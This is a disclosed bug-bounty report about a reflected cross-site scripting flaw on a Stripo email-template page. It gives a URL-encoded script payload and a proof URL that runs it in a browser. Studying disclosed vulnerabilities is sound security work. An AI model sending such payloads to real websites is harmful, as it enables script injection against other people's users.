@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/714521
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/trazer
+ReportedTo:Stripo Inc(stripo)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:26.12.2019 13:31:04
+
+Summary:
+
+hello securitty team tested windows 10 and firefox 69.0.3 (64 bit)
+
+test url: <https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry >
+
+payload: %3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E
+
+Proof Url : 
+```
+https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry%3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E
+```
+Proof Url open firefox 
+
+{F608355}
+
+## Impact
+
+https://www.owasp.org/index.php?title=Reflected_XSS
